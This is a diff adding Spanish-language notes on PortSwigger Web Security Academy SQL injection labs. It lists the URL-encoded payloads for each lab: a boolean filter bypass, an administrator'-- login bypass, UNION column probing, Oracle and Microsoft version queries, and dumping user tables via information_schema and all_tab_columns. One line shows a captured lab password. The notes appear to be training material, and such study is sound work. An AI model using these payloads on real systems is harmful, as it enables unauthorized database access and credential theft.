@@ -1,0 +1,41 @@
+--------------------------------------------------------------------------------------------------------------------------
+(Recuperar datos ocultos)
+https://0acc003a0420f2648121a25d00ae000b.web-security-academy.net/filter?category=%27+OR+1=1--
+--------------------------------------------------------------------------------------------------------------------------
+(Omitir el inicio de sesión)
+Username: administrator'--
+Contraseña: PeñarolPeñarol
+--------------------------------------------------------------------------------------------------------------------------
+(UNION- Determinar numero de columnas)
+https://0a360022034750fd808d71b100b700c5.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,NULL,NULL--
+--------------------------------------------------------------------------------------------------------------------------
+(UNION- Determinar una columna que contiene texto)
+https://0a0e0078037b1a1380bef39900840042.web-security-academy.net/filter?category=%27+GROUP+BY+3--
+https://0a0e0078037b1a1380bef39900840042.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,%27a%27,NULL--
+--------------------------------------------------------------------------------------------------------------------------
+(Consultar la Version y Tipo de la Base de Datos Oracle)
+https://0ad2006004b9ce12836cf1810052009d.web-security-academy.net/filter?category=%27+UNION+SELECT+%27a%27,%27a%27+FROM+dual--
+https://0ad2006004b9ce12836cf1810052009d.web-security-academy.net/filter?category=%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+--------------------------------------------------------------------------------------------------------------------------
+(Consultar la Version y Tipo de la Base de Datos Microsoft)
+https://0a18001f0404d07981567fec003c0093.web-security-academy.net/filter?category=%27+UNION+SELECT+%27a%27,%27a%27%23
+https://0a18001f0404d07981567fec003c0093.web-security-academy.net/filter?category=%27+UNION+SELECT+@@version,+NULL%23
+--------------------------------------------------------------------------------------------------------------------------
+(Recuperar multiples valores de una columna)
+https://0ac100ce031d22078144d9db005d0077.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,username||%27~%27||password+FROM+users--
+administrator~leoa9m3v2lajj6ywq5ms
+---------------------------------------------------------------------------------------------------------------------------
+(Recuperar datos de varias tablas)
+https://0a9f0076041dc9c281c9d99900ea0083.web-security-academy.net/filter?category=%27+UNION+SELECT+%27a%27,%27a%27--
+https://0a9f0076041dc9c281c9d99900ea0083.web-security-academy.net/filter?category=%27+UNION+SELECT+username,+password+FROM+users--
+---------------------------------------------------------------------------------------------------------------------------
+(Conseguir nombre de usuario y contraseña de una tabla desconocida)
+https://0a78003b04433d9d823ea13300c100d7.web-security-academy.net/filter?category=%27+UNION+SELECT+%27a%27,%27a%27--
+https://0a78003b04433d9d823ea13300c100d7.web-security-academy.net/filter?category=%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+https://0a78003b04433d9d823ea13300c100d7.web-security-academy.net/filter?category=%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_bptmim%27--
+https://0a78003b04433d9d823ea13300c100d7.web-security-academy.net/filter?category=%27+UNION+SELECT+username_jheylg,+password_iltbyl+FROM+users_bptmim--
+---------------------------------------------------------------------------------------------------------------------------
+(Conseguir nombre de usuario y contraseña de una tabla desconocida Oracle)
+https://0ad7000a0330b37c83fd5f1500670086.web-security-academy.net/filter?category=%27+UNION+SELECT+%27a%27,%27a%27+FROM+dual--
+https://0ad7000a0330b37c83fd5f1500670086.web-security-academy.net/filter?category=%27+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=%27USERS_MOPDAF%27--
+https://0ad7000a0330b37c83fd5f1500670086.web-security-academy.net/filter?category=%27+UNION+SELECT+PASSWORD_OZYFVV,+USERNAME_WQBBEU+FROM+USERS_MOPDAF--
